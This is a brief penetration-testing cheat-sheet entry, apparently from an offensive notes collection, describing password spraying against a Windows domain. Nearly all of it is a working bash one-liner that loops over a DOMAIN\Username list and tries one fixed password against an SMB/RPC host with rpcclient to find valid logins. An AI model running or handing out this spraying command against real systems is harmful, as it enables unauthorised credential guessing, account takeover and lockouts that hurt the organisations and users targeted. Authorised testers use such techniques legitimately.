Basic Spraying

Create a username list formatted like the following:

DOMAIN\\Username

~~~bash
cat usernames.txt | while read line; do echo $line && rpcclient -U “$line%P@ssw0rd12” -c “getusername;quit” 10.10.10.100; done
~~~

